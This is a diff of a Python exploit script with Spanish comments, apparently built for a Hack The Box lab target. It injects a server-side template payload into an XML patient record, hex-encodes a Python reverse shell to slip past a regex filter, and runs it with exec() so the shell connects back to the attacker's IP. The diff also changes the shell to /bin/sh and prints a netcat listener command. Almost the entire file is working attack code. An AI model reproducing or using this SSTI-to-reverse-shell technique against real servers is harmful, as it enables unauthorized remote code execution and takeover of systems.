@@ -1,27 +1,25 @@
 import urllib.request
 
-# Configuración fija para tu entorno actual
+# CONFIGURACIÓN
 KALI_IP = "10.10.14.209"
-KALI_PORT = "4445"
-TARGET_URL = "http://10.129.2.91:54321/addPatient"
+KALI_PORT = "443" # Cambiado a 443 por ser más estable
+TARGET_URL = "http://interpreter.htb:6661/addPatient"
 
-# Logic de Reverse Shell en Python
-# Se eliminan espacios para cumplir con las restricciones del servidor
-rev_shell_code = f"""
-import socket,os,pty
+# Payload de Reverse Shell más compatible (usa /bin/sh si bash falla)
+rev_shell = f"""
+import socket,os,subprocess
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("{KALI_IP}",{KALI_PORT}))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-pty.spawn("/bin/bash")
+subprocess.call(["/bin/sh","-i"])
 """.strip()
 
-# Codificación en Hexadecimal para evadir el filtro Regex
-# El filtro permite: ^[a-zA-Z0-9._'\"(){}=+/]+$
-hex_payload = rev_shell_code.encode().hex()
+# Bypass de Regex mediante Hex Encoding
+hex_payload = rev_shell.encode().hex()
 
-# Estructura del exploit SSTI dentro de la etiqueta <firstname>
+# Estructura SSTI basada en el Root Cause del Readme
 xml_data = f"""<patient>
     <firstname>{{exec(bytes.fromhex("{hex_payload}").decode())}}</firstname>
     <lastname>pwn</lastname>
@@ -31,17 +29,20 @@ xml_data = f"""<patient>
     <gender>pwn</gender>
 </patient>""".strip()
 
-print(f"[*] Enviando exploit a {TARGET_URL}...")
-print(f"[*] Apuntando reverse shell a {KALI_IP}:{KALI_PORT}...")
+print(f"[*] Intentando RCE en {TARGET_URL}...")
+print(f"[*] Tu Listener debe estar en: sudo nc -lvnp {KALI_PORT}")
 
 req = urllib.request.Request(
     TARGET_URL, 
     data=xml_data.encode(), 
-    headers={"Content-Type": "application/xml"}
+    headers={
+        "Content-Type": "application/xml",
+        "Host": "interpreter.htb"
+    }
 )
 
 try:
-    urllib.request.urlopen(req)
-except Exception:
-    # La conexión suele colgarse o reiniciarse cuando la shell conecta
-    print("[+] Solicitud enviada. ¡Revisa tu listener en el puerto 4445!")
+    # Si la shell conecta, este comando se quedará esperando (timeout)
+    urllib.request.urlopen(req, timeout=10)
+except Exception as e:
+    print(f"[!] Petición finalizada. Verifica tu nc.")
